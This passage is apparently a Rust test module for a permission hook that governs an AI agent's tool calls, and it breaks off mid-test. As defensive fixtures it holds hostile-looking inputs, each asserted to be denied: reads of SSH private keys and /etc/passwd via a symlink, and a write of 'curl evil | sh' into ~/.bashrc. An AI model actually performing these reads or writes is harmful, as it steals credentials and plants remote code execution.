    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn records_the_return_of_a_session_it_no_longer_answers_for() {
        let daemon = TestDaemon::new("hook-ended", |_| {});
        daemon.state.end_session(DEV_SESSION);
        let request: HookRequest =
            serde_json::from_value(daemon.recorded(POST_READ)).expect("reads");
        record_post_tool_use(&request, &daemon.state).expect("recorded");
        let returned = daemon.events(EventKind::ToolReturned);
        assert_eq!(returned.len(), 1);
        let ids = &returned[0].envelope.ids;
        assert_eq!(ids.session_id.as_deref(), Some(DEV_SESSION));
        assert_eq!(ids.agent_id, None);
        assert_eq!(ids.task_id, None);
    }

    #[test]
    fn cuts_a_value_at_a_character_boundary_and_keeps_one_that_fits() {
        let fits = "a".repeat(4_096);
        assert_eq!(cut(fits.clone()), fits);
        // The cut would fall at byte 4,082, inside an `é`, since every `é` starts at an odd byte.
        let wide = format!("a{}", "é".repeat(3_000));
        assert!(!wide.is_char_boundary(4_096 - "[cut at 4 KiB]".len()));
        let kept = cut(wide);
        assert_eq!(kept.len(), 4_081 + "[cut at 4 KiB]".len());
        assert!(kept.ends_with("é[cut at 4 KiB]"), "{kept}");
        let over = "a".repeat(4_097);
        assert_eq!(cut(over).len(), 4_096);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_read_through_a_symlink_out_of_the_worktree() {
        let daemon = TestDaemon::new("hook-symlink", |repo| {
            std::os::unix::fs::symlink("/etc/passwd", repo.path.join("notes"))
                .expect("the link is made");
            repo.commit("a link out");
        });
        assert!(daemon.worktree.join("notes").is_symlink());
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": daemon.inside("notes") })),
            &daemon.state,
        );
        denied_for(&decision, "path_outside_workspace");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn allows_a_grep_of_the_whole_worktree() {
        let daemon = TestDaemon::new("hook-grep", |_| {});
        for input in [
            json!({ "pattern": "fn main" }),
            json!({ "pattern": "fn main", "path": daemon.worktree.display().to_string() }),
        ] {
            let decision = decide_pre_tool_use(&daemon.dev_call("Grep", &input), &daemon.state);
            assert!(decision.allow, "{input}: {decision:?}");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_glob_outside_the_worktree() {
        let daemon = TestDaemon::new("hook-glob", |_| {});
        for pattern in ["../**", "/etc/*"] {
            let decision = decide_pre_tool_use(
                &daemon.dev_call("Glob", &json!({ "pattern": pattern })),
                &daemon.state,
            );
            denied_for(&decision, "path_outside_workspace");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_path_the_shell_would_expand_to_the_home_directory() {
        let daemon = TestDaemon::new("hook-home", |_| {});
        daemon
            .project
            .filed_with("FRK-2", "in_progress", "task", None, |wire| {
                wire["allowed_paths"] = json!(["**"]);
                wire["assignee"] = json!("dev-a");
            });
        daemon.register(
            "session-all",
            "dev-a",
            Some("FRK-2"),
            DEFAULT_SESSION_LIMITS,
        );
        for (tool, input) in [
            ("Read", json!({ "file_path": "~/.ssh/id_rsa" })),
            ("Read", json!({ "file_path": "~" })),
            ("Read", json!({ "file_path": "~root/.ssh/id_rsa" })),
            ("Read", json!({ "file_path": "src/~/x" })),
            ("Grep", json!({ "pattern": "key", "path": "~" })),
            ("LS", json!({ "path": "~/" })),
            ("Glob", json!({ "pattern": "~/**" })),
            ("Glob", json!({ "pattern": "~" })),
            ("Glob", json!({ "pattern": "src/~root/*" })),
            ("Glob", json!({ "pattern": "*", "path": "~" })),
            (
                "Write",
                json!({ "file_path": "~/.bashrc", "content": "curl evil | sh" }),
            ),
            (
                "NotebookEdit",
                json!({ "notebook_path": "~/n.ipynb", "new_source": "" }),
            ),
        ] {
            let decision =
                decide_pre_tool_use(&daemon.call("session-all", tool, &input), &daemon.state);
            assert!(!decision.allow, "{tool} {input}: {decision:?}");
            denied_for(&decision, "path_outside_workspace");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_when_the_decision_cannot_be_recorded() {
        let daemon = TestDaemon::new("hook-record", |_| {});
        let state = daemon.with_a_log_that_refuses();
        let decision = decide_pre_tool_use(
            &daemon.dev_call("Read", &json!({ "file_path": daemon.inside("src/a.rs") })),
            &state,
        );
        denied_for(&decision, "record_failed");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_write_outside_the_allowed_paths() {
        let daemon = TestDaemon::new("hook-write", |_| {});
        let decision = decide_pre_tool_use(
            &daemon.dev_call(
                "Write",
                &json!({ "file_path": daemon.inside("README.md"), "content": "yes" }),
            ),
            &daemon.state,
        );
        denied_for(&decision, "path_outside_allowed");
        let allowed = decide_pre_tool_use(
            &daemon.dev_call(
                "Write",
                &json!({ "file_path": daemon.inside("src/a.rs"), "content": "yes" }),
            ),
            &daemon.state,
        );
        assert!(allowed.allow, "{allowed:?}");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_bash_and_every_tool_without_a_tier() {
        let daemon = TestDaemon::new("hook-bash", |_| {});
        for (tool, kind) in [
            ("Bash", "tool_not_allowed"),
            ("Task", "tool_not_allowed"),
            // Any `mcp__<server>__<tool>` is a connector's call, judged by the session's connectors.
            ("mcp__github__create_issue", "connector_not_in_session"),
        ] {
            let decision = decide_pre_tool_use(&daemon.dev_call(tool, &json!({})), &daemon.state);
            denied_for(&decision, kind);
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_farik_tool_the_agent_has_no_tier_for() {
        let daemon = TestDaemon::new("hook-tier", |_| {});
        daemon.register("session-pm", "pm", None, DEFAULT_SESSION_LIMITS);
        let decision = decide_pre_tool_use(
            &daemon.call(
                "session-pm",
                "mcp__farik__farik_exec",
                &json!({ "command": "true" }),
            ),
            &daemon.state,
        );
        denied_for(&decision, "tier_not_granted");
        let read = decide_pre_tool_use(
            &daemon.call("session-pm", "mcp__farik__farik_read_board", &json!({})),
            &daemon.state,
        );
        assert!(read.allow, "{read:?}");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn judges_a_farik_tool_that_writes_by_the_path_it_will_write() {
        // A write_workspace tool of Farik's names the file it writes (here, a plan in the plans
        // folder), so the hook checks that path against the contract as `call_tool` does, instead
        // of finding the call names none.
        let daemon = TestDaemon::new("hook-farik-write", |_| {});
        let outside = decide_pre_tool_use(
            &daemon.dev_call("mcp__farik__farik_propose_marketing_plan", &json!({})),
            &daemon.state,
        );
        denied_for(&outside, "path_outside_allowed");
        daemon
            .project
            .filed_with("FRK-2", "in_progress", "task", None, |wire| {
                wire["allowed_paths"] = json!(["docs/marketing/**"]);
            });
        daemon.register(
            "session-docs",
            "dev-a",
            Some("FRK-2"),
            DEFAULT_SESSION_LIMITS,
        );
        let inside = decide_pre_tool_use(
            &daemon.call(
                "session-docs",
                "mcp__farik__farik_propose_marketing_plan",
                &json!({}),
            ),
            &daemon.state,
        );
        assert!(inside.allow, "{inside:?}");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_farik_tool_the_session_was_not_given() {
        let daemon = TestDaemon::new("hook-session-tools", |_| {});
        daemon.register_with_tools(
            "session-triage",
            "pm",
            Some("FRK-1"),
            DEFAULT_SESSION_LIMITS,
            &["farik_triage_request"],
        );
        let write = decide_pre_tool_use(
            &daemon.call(
                "session-triage",
                "mcp__farik__farik_write_contract",
                &json!({ "fields": { "intent": "More." } }),
            ),
            &daemon.state,
        );
        denied_for(&write, "tool_not_in_session");
        assert!(write.reason.contains("farik_write_contract"), "{write:?}");
        let triage = decide_pre_tool_use(
            &daemon.call(
                "session-triage",
                "mcp__farik__farik_triage_request",
                &json!({ "size": "small", "reason": "One file." }),
            ),
            &daemon.state,
        );
        assert!(triage.allow, "{triage:?}");
        // Whatever the purpose: a session given only the board may not write a note.
        daemon.register_with_tools(
            "session-board",
            "dev-a",
            Some("FRK-1"),
            DEFAULT_SESSION_LIMITS,
            &["farik_read_board"],
        );
        let note = decide_pre_tool_use(
            &daemon.call(
                "session-board",
                "mcp__farik__farik_write_note",
                &json!({ "kind": "progress", "text": "Half done." }),
            ),
            &daemon.state,
        );
        denied_for(&note, "tool_not_in_session");
        let denied = daemon.events(EventKind::ToolDenied);
        assert_eq!(denied.len(), 2);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_an_unknown_session_and_a_paused_agent() {
        let daemon = TestDaemon::new("hook-session", |_| {});
        let read = json!({ "file_path": daemon.inside("src/a.rs") });
        let unknown = decide_pre_tool_use(&daemon.call("nobody", "Read", &read), &daemon.state);
        denied_for(&unknown, "unknown_session");
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(|wire| {
                wire["agents"][1]["status"] = json!("paused");
            }))
            .expect("the team is written");
        let paused = decide_pre_tool_use(&daemon.dev_call("Read", &read), &daemon.state);
        denied_for(&paused, "agent_not_active");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_every_call_of_a_stopped_session() {
        let daemon = TestDaemon::new("hook-stopped", |_| {});
        assert!(
            daemon
                .state
                .request_stop(DEV_SESSION, "stopped by the human")
        );
        assert_eq!(
            daemon.state.stop_reason(DEV_SESSION).as_deref(),
            Some("stopped by the human")
        );
        // The first reason a session is given is the one kept.
        assert!(
            daemon
                .state
                .request_stop(DEV_SESSION, "agent paused by the user")
        );
        assert_eq!(
            daemon.state.stop_reason(DEV_SESSION).as_deref(),
            Some("stopped by the human")
        );
        let read = json!({ "file_path": daemon.inside("src/a.rs") });
        let decision = decide_pre_tool_use(&daemon.dev_call("Read", &read), &daemon.state);
        assert!(!decision.allow, "{decision:?}");
        assert_eq!(decision.reason, "session_stopped: stopped by the human");
        assert!(!daemon.state.request_stop("nobody", "stopped by the human"));
        assert_eq!(daemon.state.stop_reason("nobody"), None);
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn stops_the_session_of_an_agent_paused_in_the_team_file() {
        let daemon = TestDaemon::new("hook-paused-stops", |_| {});
        assert_eq!(
            daemon.state.sessions_of("dev-a"),
            vec![(
                DEV_SESSION.to_string(),
                crate::session::SessionPurpose::Implement
            )]
        );
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(|wire| {
                wire["agents"][1]["status"] = json!("paused");
            }))
            .expect("the team is written");
        let read = json!({ "file_path": daemon.inside("src/a.rs") });
        let paused = decide_pre_tool_use(&daemon.dev_call("Read", &read), &daemon.state);
        denied_for(&paused, "agent_not_active");
        assert_eq!(
            daemon.state.stop_reason(DEV_SESSION).as_deref(),
            Some("agent paused by the user")
        );
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn keeps_a_session_to_the_tiers_it_started_with() {
        let daemon = TestDaemon::new("hook-session-tiers", |_| {});
        // dev-a's session started holding `execute`; the tier is taken away while it runs.
        daemon
            .project
            .deps
            .files
            .write_team(&a_team_of_three(|wire| {
                wire["agents"][1]["revokes"] = json!(["execute"]);
            }))
            .expect("the team is written");
        let exec = json!({ "command": "true" });
        let running = decide_pre_tool_use(
            &daemon.dev_call("mcp__farik__farik_exec", &exec),
            &daemon.state,
        );
        assert!(running.allow, "{running:?}");
        let context = daemon
            .state
            .tool_context(DEV_SESSION)
            .expect("the session is registered");
        // Past the tier check: the fixture's session has no sandbox to run the command in.
        assert_eq!(
            crate::tools::fixtures::run(&context, "farik_exec", exec.clone()),
            Err(crate::tools::ToolError::Failed {
                detail: "this session has no sandbox to run a command in".to_string()
            })
        );
        daemon.register(
            "session-next",
            "dev-a",
            Some("FRK-1"),
            DEFAULT_SESSION_LIMITS,
        );
        let next = decide_pre_tool_use(
            &daemon.call("session-next", "mcp__farik__farik_exec", &exec),
            &daemon.state,
        );
        denied_for(&next, "tier_not_granted");
    }

    /// A session of `dev-a` with the skill `api-style`, whose plugin folder is `<state>/plugin`,
    /// outside the project; `cwd` is where it works.
    fn register_with_skills(
        daemon: &TestDaemon,
        session: &str,
        cwd: &std::path::Path,
        purpose: crate::session::SessionPurpose,
        limits: SessionLimits,
    ) -> std::path::PathBuf {
        use crate::daemon::SessionRegistration;

        let plugin = std::path::PathBuf::from(format!(
            "{}-state/plugin-{session}",
            daemon.project.repo.path.display()
        ));
        let _ = std::fs::remove_dir_all(&plugin);
        let skill = plugin.join("skills/api-style");
        std::fs::create_dir_all(skill.join("references")).expect("a plugin folder");
        std::fs::write(skill.join("SKILL.md"), "x").expect("a file");
        std::fs::write(skill.join("references/a.md"), "details").expect("a file");
        std::fs::create_dir_all(plugin.join(".claude-plugin")).expect("a folder");
        std::fs::write(plugin.join(".claude-plugin/plugin.json"), "{}").expect("a file");
        daemon.state.register_session(SessionRegistration {
            session_id: session.to_string(),
            agent_id: "dev-a".to_string(),
            task_id: None,
            purpose,
            in_reply_to: None,
            thread: None,
            skills: vec!["api-style".to_string()],
            skills_root: Some(plugin.join("skills")),
            cwd: cwd.to_path_buf(),
            executor: None,
            limits,
            farik_tools: Vec::new(),
            tiers: crate::tools::fixtures::tiers_of(&daemon.project.deps, "dev-a"),
            connectors: Vec::new(),
            preview: None,
        });
        plugin
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn the_hook_allows_only_the_sessions_skills() {
        let daemon = TestDaemon::new("hook-skills", |_| {});
        register_with_skills(
            &daemon,
            "session-skills",
            &daemon.worktree,
            crate::session::SessionPurpose::Implement,
            DEFAULT_SESSION_LIMITS,
        );
        let call = |input: Value| {
            decide_pre_tool_use(
                &daemon.call("session-skills", "Skill", &input),
                &daemon.state,
            )
        };
        for input in [
            json!({ "skill": "farik:api-style" }),
            json!({ "skill": "farik:api-style", "args": "x" }),
        ] {
            let allowed = call(input.clone());
            assert!(allowed.allow, "{input}: {allowed:?}");
        }
        let called = daemon.events(EventKind::ToolCalled);
        assert!(
            called
                .iter()
                .filter(|event| matches!(&event.body, EventBody::ToolCalled(body) if body.tool == "Skill"))
                .count()
                == 2,
            "two allowed calls are recorded"
        );
        for input in [
            json!({ "skill": "api-style" }),
            json!({ "skill": "deep-research" }),
            json!({ "skill": "farik:other" }),
            json!({ "skill": 3 }),
            json!({}),
            json!({ "skill": "farik:api-style", "extra": 1 }),
            json!({ "skill": "farik:api-style", "args": 5 }),
            json!({ "skill": "farik:api-style", "args": "@~/.ssh/id_rsa" }),
            json!({ "skill": "farik:api-style", "args": "see @x" }),
            json!({ "skill": "farik:api-style", "args": "x\u{3002}@y" }),
            json!({ "skill": "farik:api-style", "args": "ana@example.com" }),
            json!("farik:api-style"),
        ] {
            denied_for(&call(input.clone()), "skill_not_in_session");
        }
        // A session with no skills is denied even the plugin's name.
        let denied = decide_pre_tool_use(
            &daemon.dev_call("Skill", &json!({ "skill": "farik:api-style" })),
            &daemon.state,
        );
        denied_for(&denied, "skill_not_in_session");

        // An allowed call counts towards the limit, and at it the name is denied like any call.
        register_with_skills(
            &daemon,
            "session-limited",
            &daemon.worktree,
            crate::session::SessionPurpose::Implement,
            SessionLimits {
                max_tool_calls: 1,
                ..DEFAULT_SESSION_LIMITS
            },
        );
        let first = decide_pre_tool_use(
            &daemon.call(
                "session-limited",
                "Skill",
                &json!({ "skill": "farik:api-style" }),
            ),
            &daemon.state,
        );
        assert!(first.allow, "{first:?}");
        let second = decide_pre_tool_use(
            &daemon.call(
                "session-limited",
                "Skill",
                &json!({ "skill": "farik:api-style" }),
            ),
            &daemon.state,
        );
        denied_for(&second, "tool_call_limit");
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn a_session_in_a_private_folder_reaches_nothing_outside_it() {
        // A finance task's session works in `.farik/local/finance`, with that folder as its
        // working directory (6.6): the hook judges every path against it, so the folder is all
        // it reaches, and no exception to the protected `.farik/local/**` is needed. The hook
        // reads no role, so `dev-a`, who holds `write_workspace`, stands in for the Finance
        // Specialist's session, registered about a finance task whose contract it loads.
        use crate::daemon::SessionRegistration;

        let daemon = TestDaemon::new("hook-private-folder", |_| {});
        daemon
            .project
            .filed_with("FRK-2", "in_progress", "task", None, |wire| {
                wire["assignee_role"] = json!("finance_specialist");
                wire["reviewer_role"] = json!("product_manager");
                wire["allowed_paths"] = json!([".farik/local/finance/**"]);
                wire["exit_criteria"] = json!([{
                    "id": "C1",
                    "text": "The books exist.",
                    "satisfies": ["R1"],
                    "verification": { "method": "artifact", "path": "books.xlsx" }
                }]);
            });
        let root = daemon.project.repo.path.clone();
        let folder = root.join(".farik/local/finance");
        std::fs::create_dir_all(&folder).expect("the folder is made");
        std::fs::write(folder.join("books.xlsx"), "books").expect("written");
        std::fs::write(root.join(".farik/local/settings.json"), "{}").expect("written");
        std::fs::write(daemon.worktree.join("x"), "another task's").expect("written");
        daemon.state.register_session(SessionRegistration {
            session_id: "session-folder".to_string(),
            agent_id: "dev-a".to_string(),
            task_id: Some("FRK-2".parse().expect("a task id")),
            purpose: crate::session::SessionPurpose::Implement,
            in_reply_to: None,
            thread: None,
            skills: Vec::new(),
            skills_root: None,
            cwd: folder.clone(),
            executor: None,
            limits: DEFAULT_SESSION_LIMITS,
            farik_tools: Vec::new(),
            tiers: crate::tools::fixtures::tiers_of(&daemon.project.deps, "dev-a"),
            connectors: Vec::new(),
            preview: None,
        });
        let hook = |tool: &str, input: Value| {
            decide_pre_tool_use(&daemon.call("session-folder", tool, &input), &daemon.state)
        };
        // What is in the folder is reachable, by a path relative to it or an absolute one.
        for file in [
            "books.xlsx",
            &folder.join("books.xlsx").display().to_string(),
        ] {
            let allowed = hook("Read", json!({ "file_path": file }));
            assert!(allowed.allow, "{file}: {allowed:?}");
        }
        let allowed = hook("LS", json!({ "path": "." }));
        assert!(allowed.allow, "{allowed:?}");
        // Another task's worktree, the project's database, and the files above the folder are not.
        for file in [
            "../worktrees/FRK-1/x".to_string(),
            daemon.worktree.join("x").display().to_string(),
            root.join(".farik/local/farik.db").display().to_string(),
            "../../settings.json".to_string(),
            root.join("README.md").display().to_string(),
            "../finance/../../farik.db".to_string(),
        ] {
            denied_for(
                &hook("Read", json!({ "file_path": file })),
                "path_outside_workspace",
            );
        }
        denied_for(
            &hook("Glob", json!({ "pattern": "../worktrees/**" })),
            "path_outside_workspace",
        );
        // The copy of the folder taken for the task cannot be written over, so what the task
        // changed is always judged against the state it started from.
        std::fs::create_dir_all(folder.join(".history/FRK-2")).expect("the copy is made");
        std::fs::write(folder.join(".history/FRK-2/books.xlsx"), "books").expect("written");
        for tool in ["Write", "Edit"] {
            let refused = hook(
                tool,
                json!({ "file_path": ".history/FRK-2/books.xlsx", "content": "changed" }),
            );
            denied_for(&refused, "path_outside_allowed");
        }
        assert_eq!(
            std::fs::read_to_string(folder.join(".history/FRK-2/books.xlsx")).ok(),
            Some("books".to_string())
        );
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn reads_reach_the_skill_folder_and_writes_do_not() {
        let daemon = TestDaemon::new("hook-skill-reads", |_| {});
        let root = daemon.project.repo.path.clone();
        // The task session works in its worktree; the chat session in the project's root.
        for (session, cwd, purpose) in [
            (
                "session-task",
                daemon.worktree.clone(),
                crate::session::SessionPurpose::Implement,
            ),
            (
                "session-chat",
                root.clone(),
                crate::session::SessionPurpose::Chat,
            ),
        ] {
            let plugin =
                register_with_skills(&daemon, session, &cwd, purpose, DEFAULT_SESSION_LIMITS);
            let skills = plugin.join("skills");
            let hook = |tool: &str, input: Value| {
                decide_pre_tool_use(&daemon.call(session, tool, &input), &daemon.state)
            };
            let note = skills
                .join("api-style/references/a.md")
                .display()
                .to_string();
            let allowed = hook("Read", json!({ "file_path": note }));
            assert!(allowed.allow, "{session}: {allowed:?}");
            for (tool, input) in [
                (
                    "Glob",
                    json!({ "path": skills.display().to_string(), "pattern": "**/*.md" }),
                ),
                (
                    "Grep",
                    json!({ "path": skills.display().to_string(), "pattern": "det" }),
                ),
            ] {
                let allowed = hook(tool, input);
                assert!(allowed.allow, "{session} {tool}: {allowed:?}");
            }
            // A Glob pattern stays relative, and a link out of the folder is judged by where it
            // points.
            let absolute = hook(
                "Glob",
                json!({ "path": skills.display().to_string(), "pattern": "/etc/*" }),
            );
            denied_for(&absolute, "path_outside_workspace");
            let climbing = hook(
                "Glob",
                json!({ "path": skills.display().to_string(), "pattern": "../*" }),
            );
            denied_for(&climbing, "path_outside_workspace");
            std::os::unix::fs::symlink("/etc/hostname", skills.join("api-style/link.md"))
                .expect("a link");
            let linked = hook(
                "Read",
                json!({ "file_path": skills.join("api-style/link.md").display().to_string() }),
            );
            denied_for(&linked, "path_outside_workspace");
            // Writes there, any other tool's path there, and the plugin's other files are not.
            for (tool, input) in [
                ("Write", json!({ "file_path": note, "content": "x" })),
                (
                    "Edit",
                    json!({ "file_path": note, "old_string": "a", "new_string": "b" }),
                ),
                ("LS", json!({ "path": skills.display().to_string() })),
                (
                    "Read",
                    json!({ "file_path": plugin.join(".claude-plugin/plugin.json").display().to_string() }),
                ),
                (
                    "Read",
                    json!({ "file_path": plugin.join("skills/../x").display().to_string() }),
                ),
            ] {
                denied_for(&hook(tool, input.clone()), "path_outside_workspace");
            }
            // The session's own prompt and MCP config, in the project, stay unreadable: outside the
            // task's worktree, or under the protected `.farik/local/**` in the root.
            let mcp = root
                .join(".farik/local/sessions")
                .join(session)
                .join("mcp.json");
            let refused = hook("Read", json!({ "file_path": mcp.display().to_string() }));
            assert!(!refused.allow, "{session}: {refused:?}");
        }
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn denies_a_connector_call_outside_the_rules() {
        use farik_core::governor::permissions::{PermissionTier, SessionConnector};
        use farik_protocol::event::ConnectorTagWire;

        use crate::daemon::SessionRegistration;
        use crate::session::SessionPurpose;

        let daemon = TestDaemon::new("hook-connector", |_| {});
        let definition = farik_roles::builtin_connector("playwright").expect("shipped");
        daemon.state.register_session(SessionRegistration {
            session_id: "session-browser".to_string(),
            agent_id: "dev-a".to_string(),
            task_id: Some("FRK-1".parse().expect("a task id")),
            purpose: SessionPurpose::Implement,
            in_reply_to: None,
            thread: None,
            skills: Vec::new(),
            skills_root: None,
            cwd: daemon.worktree.clone(),
            executor: None,
            limits: DEFAULT_SESSION_LIMITS,
            farik_tools: Vec::new(),
            tiers: vec![PermissionTier::Read, PermissionTier::Network],
            connectors: vec![SessionConnector {
                server: "playwright".to_string(),
                origin: Some("http://localhost:4400".to_string()),
                tools: definition.tools,
                allowances: std::collections::BTreeMap::new(),
                plan_tools: std::collections::BTreeSet::new(),
            }],
            preview: None,
        });
        let hook = |tool: &str, input: Value| {
            decide_pre_tool_use(&daemon.call("session-browser", tool, &input), &daemon.state)
        };
        let navigate = "mcp__playwright__browser_navigate";

        let allowed = hook(navigate, json!({ "url": "http://localhost:4400/cart" }));
        assert!(allowed.allow, "{allowed:?}");
        let called = daemon.events(EventKind::ToolCalled);
        let EventBody::ToolCalled(body) = &called.last().expect("recorded").body else {
            panic!("a tool.called body");
        };
        assert_eq!(body.tool, navigate);
        assert_eq!(
            body.server.as_deref().map(String::as_str),
            Some("playwright")
        );
        assert_eq!(body.tag, Some(ConnectorTagWire::Network));

        for (tool, input, kind, server, tag) in [
            (
                navigate,
                json!({ "url": "http://example.com/" }),
                "url_outside_preview",
                "playwright",
                Some(ConnectorTagWire::Network),
            ),
            (
                "mcp__playwright__browser_evaluate",
                json!({ "function": "() => 1" }),
                "tool_denied",
                "playwright",
                Some(ConnectorTagWire::Denied),
            ),
            (
                "mcp__playwright__browser_teleport",
                json!({}),
                "tool_not_tagged",
                "playwright",
                None,
            ),
        ] {
            let decision = hook(tool, input);
            denied_for(&decision, kind);
            let denied = daemon.events(EventKind::ToolDenied);
            let EventBody::ToolDenied(body) = &denied.last().expect("recorded").body else {
                panic!("a tool.denied body");
            };
            assert_eq!(body.tool, tool);
            assert_eq!(body.reason, decision.reason);
            assert_eq!(
                body.server.as_deref().map(String::as_str),
                Some(server),
                "{tool}"
            );
            assert_eq!(body.tag, tag, "{tool}");
        }
        // A shipped connector that dev-a's own session was not given.
        let decision = decide_pre_tool_use(
            &daemon.dev_call(navigate, &json!({ "url": "http://localhost:4400" })),
            &daemon.state,
        );
        denied_for(&decision, "connector_not_in_session");
        let denied = daemon.events(EventKind::ToolDenied);
        let EventBody::ToolDenied(body) = &denied.last().expect("recorded").body else {
            panic!("a tool.denied body");
        };
        assert_eq!(
            body.server.as_deref().map(String::as_str),
            Some("playwright")
        );
        assert_eq!(body.tag, None);
        assert_eq!(daemon.events(EventKind::ToolCalled).len(), 1);
    }

    /// Registers `session-github`, a session of `dev-a` holding the `read` tier alone and given
    /// the custom server `github`, which has one tool of each tag and no origin.
    fn with_github(daemon: &TestDaemon) {
        github_session(daemon, "session-github", "dev-a");
    }

    /// Registers `session`, of `agent` on FRK-1, as `with_github` describes, and records its
    /// `session.started`.
    fn github_session(daemon: &TestDaemon, session: &str, agent: &str) {
        task_session(daemon, session, agent, "FRK-1");
    }

    /// `github_session` on `task`. `github` also has `close_issue`, and the session is given
    /// `gitlab` too, both tagged `external_effect`.
    fn task_session(daemon: &TestDaemon, session: &str, agent: &str, task: &str) {
        allowing_session(daemon, session, agent, task, None);
    }

    /// `task_session`, with `github`'s `create_issue` allowed `calls` each period unasked.
    fn allowing_session(
        daemon: &TestDaemon,
        session: &str,
        agent: &str,
        task: &str,
        calls: Option<u32>,
    ) {
        use farik_core::governor::permissions::{ConnectorTag, PermissionTier, SessionConnector};

        use crate::daemon::SessionRegistration;
        use crate::session::SessionPurpose;

        daemon.state.register_session(SessionRegistration {
            session_id: session.to_string(),
            agent_id: agent.to_string(),
            task_id: Some(task.parse().expect("a task id")),
            purpose: SessionPurpose::Implement,
            in_reply_to: None,
            thread: None,
            skills: Vec::new(),
            skills_root: None,
            cwd: daemon.worktree.clone(),
            executor: None,
            limits: DEFAULT_SESSION_LIMITS,
            farik_tools: Vec::new(),
            tiers: vec![PermissionTier::Read],
            connectors: vec![
                SessionConnector {
                    server: "github".to_string(),
                    origin: None,
                    tools: [
                        ("search_issues", ConnectorTag::Network),
                        ("create_issue", ConnectorTag::ExternalEffect),
                        ("close_issue", ConnectorTag::ExternalEffect),
                        ("delete_repo", ConnectorTag::Denied),
                    ]
                    .into_iter()
                    .map(|(tool, tag)| (tool.to_string(), tag))
                    .collect(),
                    allowances: calls
                        .map(|calls| [("create_issue".to_string(), calls)].into())
                        .unwrap_or_default(),
                    plan_tools: std::collections::BTreeSet::new(),
                },
                SessionConnector {
                    server: "gitlab".to_string(),
                    origin: None,
                    tools: [("create_issue".to_string(), ConnectorTag::ExternalEffect)].into(),
                    allowances: std::collections::BTreeMap::new(),
                    plan_tools: std::collections::BTreeSet::new(),
                },
            ],
            preview: None,
        });
        task_event(
            daemon,
            task,
            session,
            agent,
            "session.started",
            &json!({ "purpose": "implement", "model": "claude-opus-5", "effort": "high" }),
        );
    }

    /// Appends an event of `session`, of `agent` on FRK-1.
    fn session_event(daemon: &TestDaemon, session: &str, agent: &str, kind: &str, body: &Value) {
        task_event(daemon, "FRK-1", session, agent, kind, body);
    }

    /// Appends an event of `session`, of `agent` on `task`.
    fn task_event(
        daemon: &TestDaemon,
        task: &str,
        session: &str,
        agent: &str,
        kind: &str,
        body: &Value,
    ) {
        use farik_protocol::event::{NewEvent, event_from_value};

        let event = event_from_value(&json!({
            "seq": 1, "recorded_at": "2026-09-17T10:00:00Z", "team_id": "farik",
            "project_id": "farik", "task_id": task, "agent_id": agent, "session_id": session,
            "kind": kind, "body": body,
        }))
        .expect("schema-valid");
        let deps = &daemon.project.deps;
        let appended = deps
            .log
            .append(&NewEvent {
                recorded_at: event.envelope.recorded_at,
                ids: event.envelope.ids,
                body: event.body,
            })
            .expect("appends");
        deps.projections.apply(&appended).expect("projects");
    }

    /// `session` calls `create_issue` with `input`.
    fn create_issue(daemon: &TestDaemon, session: &str, input: &Value) -> HookDecision {
        decide_pre_tool_use(
            &daemon.call(session, "mcp__github__create_issue", input),
            &daemon.state,
        )
    }

    /// `session` calls `create_issue` with `input`, is asked, and the approval's seq.
    fn asked(daemon: &TestDaemon, session: &str, input: &Value) -> u64 {
        let decision = create_issue(daemon, session, input);
        denied_for(&decision, "approval_needed");
        let requested = daemon.events(EventKind::ToolApprovalRequested);
        let seq = requested.last().expect("recorded").envelope.seq;
        assert_eq!(
            decision.reason,
            format!("approval_needed: github create_issue waits for the human (approval {seq})")
        );
        seq
    }

    /// The human allows `approval`, as the command records it.
    fn grant(daemon: &TestDaemon, approval: u64) {
        daemon.project.record(
            "FRK-1",
            "tool_approval.granted",
            &json!({ "approval": approval }),
        );
    }

    /// The approval the last `tool.called` used.
    fn used(daemon: &TestDaemon) -> Option<u64> {
        let called = daemon.events(EventKind::ToolCalled);
        let EventBody::ToolCalled(body) = &called.last().expect("recorded").body else {
            panic!("a tool.called body");
        };
        body.approval.map(std::num::NonZeroU64::get)
    }

    fn github_call(daemon: &TestDaemon, tool: &str, input: &Value) -> HookDecision {
        decide_pre_tool_use(&daemon.call("session-github", tool, input), &daemon.state)
    }

    /// The server the last `tool.denied` was recorded against.
    fn last_denied_server(daemon: &TestDaemon) -> Option<String> {
        let denied = daemon.events(EventKind::ToolDenied);
        let EventBody::ToolDenied(body) = &denied.last().expect("recorded").body else {
            panic!("a tool.denied body");
        };
        body.server.as_deref().map(ToString::to_string)
    }

    #[test]
    #[ignore = "needs the git program: cargo xtask check --integration"]
    fn the_hook_judges_any_connector_the_session_has() {
        use farik_protocol::event::ConnectorTagWire;

        let daemon = TestDaemon::new("hook-custom", |_| {});
        with_github(&daemon);
        // `network` runs whatever the agent's tiers, and with no origin any url.
        let search = "mcp__github__search_issues";
        let allowed = github_call(
